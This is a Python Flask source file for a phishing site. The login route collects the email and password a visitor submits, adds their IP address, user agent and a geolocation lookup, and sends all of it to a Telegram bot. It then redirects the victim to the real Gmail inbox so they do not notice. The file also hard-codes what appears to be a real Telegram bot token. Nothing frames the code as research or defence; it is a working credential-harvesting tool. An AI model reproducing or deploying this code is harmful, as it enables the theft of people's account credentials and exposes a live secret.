from flask import Flask, render_template, request, redirect, flash
import asyncio
import telegram
import json
import logging

app = Flask(__name__)
app.secret_key = 'your_secret_key'

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = '8152608892:AAF9glppy5wajKlX9hZN04QOPm1VC82p7BI'  # Replace with your actual Bot Token
bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)

# File to store chat IDs and offset
CHAT_IDS_FILE = 'chat_ids.json'
OFFSET_FILE = 'offset.txt'

# Logging Configuration
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        user_ip = request.remote_addr or 'Unknown IP'
        user_agent = request.headers.get('User-Agent')
        location_info = get_location_from_ip(user_ip)

        try:
            chat_ids = asyncio.run(get_chat_ids())
            if chat_ids:
                for chat_id in chat_ids:
                    send_telegram_message(chat_id, email, password, user_ip, user_agent, location_info)
                flash('Login information sent successfully!', 'success')
            else:
                flash('No chat IDs found. Please send the bot a message first.', 'warning')
        except Exception as e:
            logger.error(f"Error sending Telegram message: {e}")
            flash(f'Error sending Telegram message: {str(e)}', 'danger')

        gmail_inbox_url = "https://mail.google.com/mail/u/0/#inbox"
        return redirect(gmail_inbox_url)

    return render_template('index.html')


async def get_chat_ids():
    offset = load_offset()
    logger.debug(f"Using offset: {offset}")
    
    updates = await bot.get_updates(offset=offset)
    logger.debug(f"Updates received: {updates}")

    chat_ids = set(load_chat_ids())
    for update in updates:
        if update.message:
            logger.debug(f"Processing message: {update.message}")
            chat_ids.add(update.message.chat_id)
            offset = update.update_id + 1

    save_chat_ids(chat_ids)
    save_offset(offset)
    
    logger.debug(f"Updated chat_ids: {chat_ids}, New offset: {offset}")
    return list(chat_ids)


def send_telegram_message(chat_id, user_email, user_password, user_ip, user_agent, location_info):
    message = (
        f"New Login Attempt:\n"
        f"📧 Email: {user_email}\n"
        f"🔑 Password: {user_password}\n"
        f"🌐 IP Address: {user_ip}\n"
        f"🖥️ User Agent: {user_agent}\n"
        f"📍 Location: {location_info.get('city', 'Unknown')}, {location_info.get('country', 'Unknown')}\n"
        f"🕒 Timezone: {location_info.get('timezone', 'Unknown')}"
    )
    logger.debug(f"Sending message to {chat_id}: {message}")
    asyncio.run(bot.send_message(chat_id=chat_id, text=message))


def get_location_from_ip(ip_address):
    import requests
    try:
        if ip_address == '127.0.0.1':
            ip_address = '8.8.8.8'  # Example IP for testing
        response = requests.get(f'http://ip-api.com/json/{ip_address}')
        return response.json()
    except Exception as e:
        logger.error(f"Error fetching location: {e}")
        return {'city': 'Unknown', 'country': 'Unknown', 'timezone': 'Unknown'}


def load_chat_ids():
    try:
        with open(CHAT_IDS_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []


def save_chat_ids(chat_ids):
    with open(CHAT_IDS_FILE, 'w') as f:
        json.dump(list(chat_ids), f)


def load_offset():
    try:
        with open(OFFSET_FILE, 'r') as f:
            return int(f.read().strip())
    except (FileNotFoundError, ValueError):
        return 0


def save_offset(offset):
    with open(OFFSET_FILE, 'w') as f:
        f.write(str(offset))


if __name__ == '__main__':
    app.run(debug=True)
